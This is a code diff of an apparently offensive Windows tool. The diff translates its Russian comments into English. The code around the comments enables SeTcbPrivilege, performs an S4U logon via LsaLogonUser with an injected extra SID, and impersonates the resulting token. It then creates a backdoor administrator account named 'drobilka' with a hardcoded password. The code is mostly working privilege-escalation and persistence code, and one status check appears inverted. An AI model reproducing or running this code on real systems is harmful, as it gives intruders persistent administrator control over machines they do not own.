@@ -37,11 +37,11 @@ NTSTATUS LsaClean()
 NTSTATUS LsaInit()
 {
     NTSTATUS status = 0;
-    // Открытие обработчика политики LSA
+    // Open LSA policy handle
     status = LsaConnectUntrusted(&hLSA);
     if (status != STATUS_SUCCESS)
     {
-        // Поиск идентификатора пакета аутентификации
+        // Look up the authentication package ID
         status = LsaLookupAuthenticationPackage(hLSA, &MSV1_0_PackageName, &ulAuthenticationPackage);
         isAuthPackageKerberos = NT_SUCCESS(status);
     }
@@ -56,7 +56,7 @@ BOOL CreateAdminUser()
     DWORD dwLevel = 1;
     DWORD dwError = 0;
 
-    // Настройка информации о пользователе
+    // Set up user information
     wchar_t username[] = L"drobilka";
     wchar_t password[] = L"P@ssw0rd123!";
     
@@ -67,7 +67,7 @@ BOOL CreateAdminUser()
     ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
     ui.usri1_script_path = NULL;
 
-    // 1. Попытка создать пользователя
+    // 1. Attempt to create the user
     nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);
 
     if (nStatus == NERR_Success)
@@ -84,7 +84,7 @@ BOOL CreateAdminUser()
         return FALSE;
     }
 
-    // 2. Добавление юзверя в группу администраторов
+    // 2. Add the user to the Administrators group
     account.lgrmi3_domainandname = username;
     nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
 
@@ -107,11 +107,11 @@ BOOL CreateAdminUser()
 
 BOOL CreateUserAlternativeMethod()
 {
-    // Альтернативный метод создания юзверя, используя SeTcbPrivilege
+    // Alternative user creation method using SeTcbPrivilege
     wprintf(L"[*] Using SeTcbPrivilege to create user...\n");
 
-    // Здесь можно использовать LsaCreateAccount или другие низкоуровневые API
-    // Но для мы просто попробуем NetUserAdd еще раз с повышенными правами
+    // LsaCreateAccount or other low-level APIs could be used here
+    // For now, just try NetUserAdd again with elevated privileges
 
     USER_INFO_1 ui = { 0 };
     wchar_t username[] = L"drobilka";
@@ -199,7 +199,7 @@ BOOL DisplayTokenInformation(HANDLE hToken)
     LPWSTR lpGroupSid;
     LPWSTR lpIntegritySid;
 
-    // Получение статистической информации о токене
+    // Retrieve token statistics
     if (!GetTokenInformation(hToken, TokenStatistics, pTokenStatistics, 0, &dwLength))
     {
         if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
@@ -336,7 +336,7 @@ NTSTATUS DoS4U(HANDLE hToken)
 
     TOKEN_MANDATORY_LABEL TIL = { 0 };
 
-    // Декларируем все переменные на старте чтобы избежать goto issues
+    // Declare all variables at the top to avoid goto issues
     WCHAR szUsername[256] = { 0 };
     DWORD dwSize = sizeof(szUsername) / sizeof(WCHAR);
     LPCWSTR szDomain = L".";
@@ -345,14 +345,14 @@ NTSTATUS DoS4U(HANDLE hToken)
     PSID mediumSID = NULL;
     const NTSTATUS STATUS_ACCOUNT_RESTRICTION = 0xC000006E;
 
-    // Инициализируем mediumSID ранее
+    // Initialize mediumSID early
     if (!ConvertStringSidToSidW(mediumInt, &mediumSID))
     {
         wprintf(L"[-] ConvertStringSidToSidW failed: %d\n", GetLastError());
         goto Clear;
     }
 
-    // Получаем нынешний юзернейм
+    // Get the current username
     if (!GetUserNameW(szUsername, &dwSize))
     {
         wprintf(L"[-] GetUserNameW failed: %d\n", GetLastError());
@@ -379,7 +379,7 @@ NTSTATUS DoS4U(HANDLE hToken)
 
     wprintf(L"[*] Initialize S4U login for user: %ws\n", szUsername);
 
-    // Создание структуры MSV1_0_S4U_LOGON
+    // Build the MSV1_0_S4U_LOGON structure
     dwMsgS4ULength = sizeof(MSV1_0_S4U_LOGON) +
         (EXTRA_SID_COUNT + wcslen(szDomain) + wcslen(szUsername)) * sizeof(WCHAR);
     pS4uLogon = (PMSV1_0_S4U_LOGON)LocalAlloc(LPTR, dwMsgS4ULength);
@@ -397,7 +397,7 @@ NTSTATUS DoS4U(HANDLE hToken)
     strcpy_s(TokenSource.SourceName, TOKEN_SOURCE_LENGTH, "User32");
     AllocateLocallyUniqueId(&TokenSource.SourceIdentifier);
 
-    // Создание групп токенов
+    // Build token groups
     pGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, sizeof(TOKEN_GROUPS) + 2 * sizeof(SID_AND_ATTRIBUTES));
     if (pGroups == NULL)
     {
@@ -405,7 +405,7 @@ NTSTATUS DoS4U(HANDLE hToken)
         goto Clear;
     }
 
-    // Добавление SID входа, если присутствует
+    // Add the logon SID if present
     if (pLogonSid)
     {
         pGroups->Groups[pGroups->GroupCount].Attributes =
@@ -414,13 +414,13 @@ NTSTATUS DoS4U(HANDLE hToken)
         pGroups->GroupCount++;
     }
 
-    // Добавление дополнительного SID
+    // Add the extra SID
     pGroups->Groups[pGroups->GroupCount].Attributes =
         SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
     pGroups->Groups[pGroups->GroupCount].Sid = pExtraSid;
     pGroups->GroupCount++;
 
-    // Вызов LsaLogonUser
+    // Call LsaLogonUser
     status = LsaLogonUser(
         hLSA,
         &OriginName,
@@ -448,7 +448,7 @@ NTSTATUS DoS4U(HANDLE hToken)
 
     wprintf(L"[*] LsaLogonUser succeeded\n");
 
-    // Установка уровня целостности токена на средний
+    // Set token integrity level to medium
     TIL.Label.Attributes = SE_GROUP_INTEGRITY;
     TIL.Label.Sid = mediumSID;
 
@@ -459,7 +459,7 @@ NTSTATUS DoS4U(HANDLE hToken)
         goto Clear;
     }
 
-    // Имперсонация токена
+    // Impersonate the token
     if (!ImpersonateLoggedOnUser(hTokenS4U))
     {
         wprintf(L"[-] ImpersonateLoggedOnUser failed: %d\n", GetLastError());
@@ -468,7 +468,7 @@ NTSTATUS DoS4U(HANDLE hToken)
 
     wprintf(L"[*] Successfully impersonated token\n");
 
-    // Крафтим админа
+    // Create the admin user
     if (CreateAdminUser())
     {
         wprintf(L"[*] Successfully created admin user 'drobilka'\n");
@@ -478,7 +478,7 @@ NTSTATUS DoS4U(HANDLE hToken)
         wprintf(L"[-] Failed to create admin user\n");
     }
 
-    // Возврат на себя
+    // Revert to self
     RevertToSelf();
 
 Clear:
@@ -499,19 +499,19 @@ BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
     LUID luidValue = { 0 };
     TOKEN_PRIVILEGES tokenPrivileges;
 
-    // Получение значения LUID привилегии для локальной системы
+    // Look up the LUID of the privilege on the local system
     if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
     {
         wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
         return status;
     }
 
-    // Настройка информации о повышении прав
+    // Set up privilege escalation information
     tokenPrivileges.PrivilegeCount = 1;
     tokenPrivileges.Privileges[0].Luid = luidValue;
     tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-    // Повышение прав доступа к токену процесса
+    // Elevate process token privileges
     if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
     {
         wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
@@ -534,7 +534,7 @@ int wmain(int argc, wchar_t* argv[])
         return 0;
     }
 
-    // Включение SeRestorePrivilege для текущего токена процесса
+    // Enable SeTcbPrivilege (SE_TCB_NAME) for the current process token
     if (EnableTokenPrivilege(hToken, SE_TCB_NAME))
     {
         if (NT_SUCCESS(DoS4U(hToken)))
